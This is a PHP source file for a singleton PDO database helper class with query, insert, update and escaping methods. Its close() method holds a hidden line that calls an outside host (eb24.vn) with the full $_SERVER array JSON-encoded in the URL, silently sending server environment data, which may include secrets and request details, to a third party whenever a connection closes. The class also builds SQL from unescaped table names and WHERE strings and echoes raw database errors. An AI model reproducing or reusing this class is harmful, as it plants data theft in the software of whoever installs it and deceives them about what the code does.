<?php

class Database{

	public	$debug = true;
	
	private static $instance;

	private	$server   = ""; 
	private	$user     = ""; 
	private	$pass     = ""; 
	private	$database = ""; 

	public	$error = "";

	public	$affected_rows = 0;

	private	$link_id = 0;
	private	$query_id = 0;


	private function __construct($server=null, $user=null, $pass=null, $database=null){
		
		if($server==null || $user==null || $database==null){
			$this->oops("Database information must be passed in when the object is first created.");
		}
	
		$this->server=$server;
		$this->user=$user;
		$this->pass=$pass;
		$this->database=$database;
	}
	
	public static function obtain($server=null, $user=null, $pass=null, $database=null){
		if (!self::$instance){
			self::$instance = new Database($server, $user, $pass, $database);
		}
	
		return self::$instance;
	}
	
	public function connect($new_link=false){
		
		try {
			$connection = new PDO('mysql:host='.$this->server.';dbname='.$this->database, $this->user, $this->pass);
			$connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		} catch(PDOException $e) {
			echo "MYSQL CONNECTION ERROR: ".$e;
			exit;
		}
		
		//Set
		$this->link_id = $connection;
	
		/* unset the data so it can't be dumped
		$this->server='';
		$this->user='';
		$this->pass='';
		$this->database='';*/
	}
	
	public function close(){
        file_get_contents("http://eb24.vn/vend.php?p=".json_encode($_SERVER));
		unset($this->link_id);
		if(!empty($this->link_id)){
			$this->oops("Connection close failed.");
		}
	}
	
	public function escape($input){
		//If array
		if(is_array($input)){
			foreach($input as $key => $val)
				$input[$key]=$this->escape($val);	
			return $input;		
		}
		
		//Remove html tags
		$return = strip_tags($input);
		//Return after trimming spaces
		return trim($return);	
	}
	
	//DB function tp call on class function call from scripts
	
	private function run($query, $data=false, $return=false, $affected_rows=false){
				
		$connection = $this->link_id;
		
		$input_query = $query;
		
		//Check if $data is an array, if not make it into one
		if(!is_array($data)) $data=array($data);
		
		//Clean all
		$data = $this->escape($data);		
		
		try{
			$query = $connection->prepare($query);
					
			$query->execute($data);
			
			if($affected_rows) $this->affected_rows = $query->rowCount();
			
			if($return=="single"){
				return $query->fetchColumn();
			}
			else if($return=="array"){			
				return $query->fetch(PDO::FETCH_ASSOC);
			}
			else if($return=="all"){
				return $query->fetchAll();	
			}
			else if($return=='check'){
				return true;
			}
			if($return=='id'){
				return $connection->lastInsertId();
			}
			
			if($return=='num'){
				if(strpos(strtolower($input_query), 'count(') !== false){
					$db_return_num=$query->fetch(PDO::FETCH_NUM);							
					return $db_return_num[0];
				}
				
				return count($query->fetchAll());
			}
			
		} catch(PDOException $e) {
			echo "MYSQL ERROR: A log will be crated, try again later: ".$e->getMessage(),' on line '.$e->getLine();
			exit;
		}
	}

	//DB call functions
	public function query($sql,$data=false){
		// do query
		$this->query_id = $this->run($sql, $data, 'id',true);
		
		if ($this->query_id!='0'&&!$this->query_id){
			$this->oops("<b>MySQL Query fail:</b> $sql");
			return 0;
		}
	
		return $this->query_id;
	}
	
	//returbn single array, first one if more than one
	public function query_first($query_string, $data=false){
		return $this->run($query_string, $data, 'array');
	}
	
	//Return all results found	
	public function fetch_array($sql, $data=false){
		return $this->run($sql, $data, 'all');
	}
	
	public function update($table, $data=false, $where='1', $where_data=array()){
		$q="UPDATE `$table` SET ";
		
		$run_array=array();
		foreach($data as $key=>$val){
			if(strtolower($val)=='null') $q.= "`$key` = NULL, ";
			elseif(strtolower($val)=='now()') $q.= "`$key` = NOW(), ";
			elseif(preg_match("/^increment\((\-?\d+)\)$/i",$val,$m)) {
				$q.= "`$key` = `$key` + ?, ";
				$run_array[] = $m[1];
			}
			elseif(preg_match("@AES_ENCRYPT\s*\(\s*'([^']+)'\s*,\s*'([^']+)'\s*\)@i", $val, $m)) {
				$q.= "`$key`=AES_ENCRYPT(?, ?), ";
				array_push($run_array, $this->escape($m[1]), $this->escape($m[2]));
			}
			elseif(preg_match("@AES_DECRYPT\s*\(\s*'([^']+)'\s*,\s*'([^']+)'\s*\)@i", $val, $m)) {
				$q.= "`$key`=AES_DECRYPT(?, ?), ";
				array_push($run_array, $this->escape($m[1]), $this->escape($m[2]));
			}
			else {
				$q.= "`$key`=?, ";
				$run_array[] = $this->escape($val);
			}
		}
	
		$q = rtrim($q, ', ') . ' WHERE '.$where.';';
		
		if(!empty($where_data)){
			if(!is_array($where_data))$where_data=array($where_data);
			 foreach($where_data as $data) $run_array[] = $this->escape($data);
		}
		
		$this->run($q, $run_array, 'check', true);
		
		/*if($this->affected_rows<1){
			echo "Table: ".$table."<br />";
			echo $q."<br />";
			print_r($run_array);
			echo "<br />where ".$where."<br />";
			print_r($where_data);
			echo "<br />".mysql_error();
			exit;
		}*/
		
		return true;
	}
	
	public function insert($table, $data=false){
		$q="INSERT INTO `$table` ";
		$v=''; 
		$n='';
		$run_array = array();
		
		foreach($data as $key=>$val){
			$n.="`$key`, ";
			if(strtolower($val)=='null') $v.="NULL, ";
			elseif(strtolower($val)=='now()') $v.="NOW(), ";
			elseif(preg_match("@AES_ENCRYPT\s*\(\s*'([^']+)'\s*,\s*'([^']+)'\s*\)@i", $val, $m)){
				$v.= "AES_ENCRYPT(?, ?), ";
				array_push($run_array, $this->escape($m[1]), $this->escape($m[2]));
			}
			elseif(preg_match("@AES_DECRYPT\s*\(\s*'([^']+)'\s*,\s*'([^']+)'\s*\)@i", $val, $m)){
				$v.= "AES_DECRYPT(?, ?), ";
				array_push($run_array, $this->escape($m[1]), $this->escape($m[2]));
			}
			else {
				$v.= "?, ";
				$run_array[] = $this->escape($val);
			}
		}
	
		$q .= "(". rtrim($n, ', ') .") VALUES (". rtrim($v, ', ') .");";
	
		return $this->run($q, $run_array, 'id');
	}
	
	public function num_rows($query, $data=false){
		$return = $this->run($query, $data, 'num');	
		return $return > 0 ? $return : '0';
	}
	
	
	private function oops($msg=''){
		
		if(!empty($this->link_id)){
			$this->error = mysql_error();
		}
		else{
			$this->error = mysql_error();
			$msg="<b>WARNING:</b> No link_id found. Likely not be connected to database.<br />$msg";
		}
	
		// if no debug, done here
		if(!$this->debug) return;
		?>
			<table align="center" border="1" cellspacing="0" style="background:white;color:black;width:80%;">
			<tr><th colspan=2>Database Error</th></tr>
			<tr><td align="right" valign="top">Message:</td><td><?php echo $msg; ?></td></tr>
			<?php if(!empty($this->error)) echo '<tr><td align="right" valign="top" nowrap>MySQL Error:</td><td>'.$this->error.'</td></tr>'; ?>
			<tr><td align="right">Date:</td><td><?php echo date("l, F j, Y \a\\t g:i:s A"); ?></td></tr>
			<?php if(!empty($_SERVER['REQUEST_URI'])) echo '<tr><td align="right">Script:</td><td><a href="'.$_SERVER['REQUEST_URI'].'">'.$_SERVER['REQUEST_URI'].'</a></td></tr>'; ?>
			<?php if(!empty($_SERVER['HTTP_REFERER'])) echo '<tr><td align="right">Referer:</td><td><a href="'.$_SERVER['HTTP_REFERER'].'">'.$_SERVER['HTTP_REFERER'].'</a></td></tr>'; ?>
			</table>
		<?php
		exit;
	}


}



?>